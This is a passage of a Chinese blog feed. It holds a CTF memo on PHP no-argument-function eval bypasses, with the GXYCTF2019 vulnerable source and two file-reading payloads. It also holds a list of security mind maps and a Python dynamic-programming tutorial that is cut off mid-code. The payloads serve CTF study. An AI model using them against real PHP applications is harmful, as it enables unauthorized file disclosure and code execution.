title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li><li><code>floor(phpversion())</code>返回<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li></ul><p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p><p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p><p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p><p>目录操作：</p><ul><li><strong>getchwd()</strong> ：函数返回当前工作目录。</li><li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li><li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li><li><strong>chdir()</strong> ：函数改变当前的目录。</li></ul><p>数组相关的操作：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show_source(session_id(session_start()));</span><br><span class="line">Cookie: PHPSESSID=flag.php</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思维导图收集</title>
      <link href="/2020/04/27/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/"/>
      <url>/2020/04/27/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h3 id="网络安全绪论"><a href="#网络安全绪论" class="headerlink" title="网络安全绪论"></a>网络安全绪论</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全绪论.jpg" alt="网络安全绪论" style="zoom:25%;" /><h3 id="网络安全发展与未来"><a href="#网络安全发展与未来" class="headerlink" title="网络安全发展与未来"></a>网络安全发展与未来</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全发展与未来.jpg" alt="网络安全发展与未来" style="zoom:25%;" /><h3 id="Web攻击及防御技术"><a href="#Web攻击及防御技术" class="headerlink" title="Web攻击及防御技术"></a>Web攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/Web攻击及防御技术.jpg" alt="Web攻击及防御技术" style="zoom:25%;" /><h3 id="网络监听及防御技术"><a href="#网络监听及防御技术" class="headerlink" title="网络监听及防御技术"></a>网络监听及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络监听及防御技术.jpg" alt="网络监听及防御技术" style="zoom:25%;" /><h3 id="扫描与防御技术"><a href="#扫描与防御技术" class="headerlink" title="扫描与防御技术"></a>扫描与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/扫描与防御技术.jpg" alt="扫描与防御技术" style="zoom:25%;" /><h3 id="欺骗攻击及防御技术"><a href="#欺骗攻击及防御技术" class="headerlink" title="欺骗攻击及防御技术"></a>欺骗攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/欺骗攻击及防御技术.jpg" alt="欺骗攻击及防御技术" style="zoom:25%;" /><h3 id="木马攻击及防御技术"><a href="#木马攻击及防御技术" class="headerlink" title="木马攻击及防御技术"></a>木马攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/木马攻击及防御技术.jpg" alt="木马攻击及防御技术" style="zoom:25%;" /><h3 id="口令破解与防御技术"><a href="#口令破解与防御技术" class="headerlink" title="口令破解与防御技术"></a>口令破解与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/口令破解与防御技术.jpg" alt="口令破解与防御技术" style="zoom:25%;" /><h3 id="拒绝服务供给与防御技术"><a href="#拒绝服务供给与防御技术" class="headerlink" title="拒绝服务供给与防御技术"></a>拒绝服务供给与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/拒绝服务供给与防御技术.png" alt="拒绝服务供给与防御技术" style="zoom:25%;" /><h3 id="缓冲区溢出攻击及防御技术"><a href="#缓冲区溢出攻击及防御技术" class="headerlink" title="缓冲区溢出攻击及防御技术"></a>缓冲区溢出攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/缓冲区溢出攻击及防御技术.jpg" alt="缓冲区溢出攻击及防御技术" style="zoom:25%;" /><h3 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/计算机病毒.jpg" alt="计算机病毒" style="zoom:25%;" /><h3 id="网络攻击链手段防护产品"><a href="#网络攻击链手段防护产品" class="headerlink" title="网络攻击链手段防护产品"></a>网络攻击链手段防护产品</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络攻击链手段防护产品.png" alt="网络攻击链手段防护产品" style="zoom:10%;" /><h3 id="nginx源码分析全景图"><a href="#nginx源码分析全景图" class="headerlink" title="nginx源码分析全景图"></a>nginx源码分析全景图</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/nginx源码分析全景图.png" alt="nginx源码分析全景图" style="zoom:6%;" /><p>另外在P神的github上也有些：<a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><ul><li>图片均来自网络，侵删</li></ul>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思维导图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法-动态规划</title>
      <link href="/2020/04/21/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
      <url>/2020/04/21/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><p><code>1,1,2,3,5,8,13...</code>，状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt=""></p><h4 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span> <span class="keyword">or</span> a == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> main(a<span class="number">-1</span>) + main(a<span class="number">-2</span>)</span><br></pre></td></tr></table></figure><p>时间复杂度为<code>O(2^n)</code>，有如下递归树：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt=""></p><p>我们可以看到许多的计算都重复了，例如下面的<code>f(18)</code>等，那么如何避免这个问题呢？有效的方法就是将第一次计算出的<code>f(18)</code>的结果保留下来，如果下次再计算到这个<code>f(18)</code>的时候直接将结果取出来即可，简称备忘录方法，如下：</p><h4 id="带备忘录的递归解法"><a href="#带备忘录的递归解法" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">memo = dict()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span> <span class="keyword">or</span> a == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">in</span> memo:</span><br><span class="line">        <span class="keyword">return</span> memo[a]</span><br><span class="line">    memo[a] = main(a<span class="number">-1</span>) + main(a<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">return</span> main(a<span class="number">-1</span>) + main(a<span class="number">-2</span>)</span><br></pre></td></tr></table></figure><h4 id="DP-table解法"><a href="#DP-table解法" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><p>自底向上优化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dp = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span> <span class="keyword">or</span> a == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    dp.append(<span class="number">1</span>)</span><br><span class="line">    dp.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, a):</span><br><span class="line">        dp.append(dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>])</span><br><span class="line">    <span class="keyword">return</span> dp[a<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><p>原理图如下(emmmmm，图是搬运过来的，所以前面的第0位还是用到了的，往前移一位就行了)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt=""></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>再进行空间复杂度的优化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(a)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">1</span> <span class="keyword">or</span> a == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    prev = <span class="number">1</span></span><br><span class="line">    curr = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, a + <span class="number">1</span>):</span><br><span class="line">        num = prev + curr</span><br><span class="line">        prev = curr</span><br><span class="line">        curr = num</span><br><span class="line">    <span class="keyword">return</span> curr</span><br></pre></td></tr></table></figure><p>由原来的时间复杂度<code>O(2^n)</code>变为了<code>O(n)</code>，空间复杂度降为<code>O(1)</code></p><h3 id="凑零钱问题"><a href="#凑零钱问题" class="headerlink" title="凑零钱问题"></a>凑零钱问题</h3><p>假设给你<code>k</code>中面值的硬币，面值分别为<code>c1，c2，c3 ... ck</code>，每种硬币的数量无限，再给一个总金额<code>amount</code>，问<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，则返回-1</p><p>状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt=""></p><h4 id="暴力递归-1"><a href="#暴力递归-1" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins, amount)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:  <span class="comment"># 当n - coin = 0 的时候说明这条路走的通</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:  <span class="comment"># 当n - coin &lt; 0 的时候则说明这条路走不通</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        res = float(<span class="string">"INF"</span>)  <span class="comment"># float("INF")为正无穷大，负无穷大则为float("-INF")</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:  <span class="comment"># 递归列表</span></span><br><span class="line">            sub = main(n - coin)  <span class="comment"># 取出一个值n就要减去那个值</span></span><br><span class="line">            <span class="keyword">if</span> sub == <span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">continue</span>  <span class="comment"># 当main函数的返回值为-1的时候，这条路走不通，则挑出循环</span></span><br><span class="line">            res = min(res, <span class="number">1</span> + sub)  <span class="comment"># 当到了树的最低下，上面的if语句没有执行跳出去，则使res=sub+1</span></span><br><span class="line">        <span class="keyword">return</span> res <span class="keyword">if</span> res != float(<span class="string">"INF"</span>) <span class="keyword">else</span> <span class="number">-1</span>  <span class="comment"># 这条路走的通，则返回res的值给sub，结合上面的一条语句进行计数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> main(amount)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后取出第一个选择的那个数字的时候计算出的res最小值，然后再把每个数字的最小值拿出来比较得出最终的最小值</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(coinChange([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>], <span class="number">11</span>))</span><br></pre></td></tr></table></figure><p>以上的路走的通的意思是能够凑出这些硬币，递归图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt=""></p><h4 id="带备忘录的递归解法-1"><a href="#带备忘录的递归解法-1" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins, amount)</span>:</span></span><br><span class="line">    memo = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">in</span> memo:  <span class="comment"># 查找备忘录，避免重复计算，就是计算以上颜色相同的部分</span></span><br><span class="line">            <span class="keyword">return</span> memo[n]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        res = float(<span class="string">"INF"</span>)</span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            sub = main(n - coin)</span><br><span class="line">            <span class="keyword">if</span> sub == <span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            res = min(res, <span class="number">1</span> + sub)</span><br><span class="line">        memo[n] = (res <span class="keyword">if</span> res != float(<span class="string">"INF"</span>) <span class="keyword">else</span> <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> main(amount)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(coinChange([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>], <span class="number">11</span>))</span><br></pre></td></tr></table></figure><h4 id="DP-table解法-1"><a href="#DP-table解法-1" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(coins, a)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(a + <span class="number">1</span>):</span><br><span class="line">        dp.append(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(a + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">if</span> i - coin &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dp[i] = min(dp[i], <span class="number">1</span> + dp[i - coin])</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span> <span class="keyword">if</span> dp[a] == (a + <span class="number">1</span>) <span class="keyword">else</span> dp[a]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dp = []</span><br><span class="line">    print(main([<span class="number">1</span>, <span class="number">2</span>, <span class="number">5</span>], <span class="number">11</span>))</span><br></pre></td></tr></table></figure><p>演示图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421220220973.png" alt=""></p><p>借用大佬的一句话：</p><p>计算机解决问题其实没有任何奇技淫巧，他唯一的解决方法就是穷举，穷举所有的可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明的穷举”</p><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422111536792.png" alt=""></p><h4 id="动态规划解法"><a href="#动态规划解法" class="headerlink" title="动态规划解法"></a>动态规划解法</h4><p>动态规划的核⼼设计思想是数学归纳法。</p><p>假设当结论在<code>k&lt;n</code>的时候成立，然后想办法证明<code>k=n</code>的时候结论也成立，如果能够证明的出来，那么就说明这个结论对于任何数都成立，再看到这个题目，假如我们能够证明，最后一个<code>nums[i]</code>的值大于前一个<code>nums[j]</code>的值，那么就能够证明出他和<code>nums[j]</code>所构成的最长递增子序列能够结合，随后再将长度加一，且将<code>nums[i]</code>加入到这个最长递增子序列中，即：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/gif2.gif" alt=""></p><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(nums)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    dp = []  <span class="comment"># 定义每一位数的最长递增子序列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        dp.append(<span class="number">1</span>)  <span class="comment"># 令每一位的初始值为1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[j]:</span><br><span class="line">                dp[i] = max(dp[i], dp[j] + <span class="number">1</span>)  <span class="comment"># dp[i]表示nums[i]这个数结尾的最长递增子序列的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dp)):</span><br><span class="line">        res = max(res, dp[i])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(main([<span class="number">8</span>, <span class="number">7</span>, <span class="number">10</span>]))</span><br></pre></td></tr></table></figure><p>可见时间复杂度为O(n^2)</p><h4 id="二分查找解法"><a href="#二分查找解法" class="headerlink" title="二分查找解法"></a>二分查找解法</h4><p>将输入的序列分成若干堆，需要遵循以下规则：</p><p>只能把小的数字压到比它大的数字上，也就是用小的数字覆盖掉原来大的，那么如何去压呢？那么就看该数字该如何选择了，如果当前数字较大没有可以放置的堆，那么就在边上新建一个堆，再把数字放进去，如果有多个堆可以选择，则选择这多个堆中考最左边的位置，保证堆顶的数字是有序的了，就像这样（A是最大的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120140509.png" alt=""></p><p>这样堆顶的数字就可以形成一个最长递增子序列，当然序列肯定不止一个，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200422120330841.png" alt=""></p><p>能够保证得出最长递增子序列，随后在查找该放在哪个堆的时候使用二分法查找就可以提高效率，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(nums)</span>:</span></span><br><span class="line">    piles = <span class="number">0</span>  <span class="comment">#定义最长递增子序列的长度</span></span><br><span class="line">    top = []  <span class="comment"># 定义每一位数的最长递增子序列</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        top.append(<span class="number">0</span>)  <span class="comment"># 令每一位的初始值为1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">        poker = nums[i]</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = piles</span><br><span class="line">        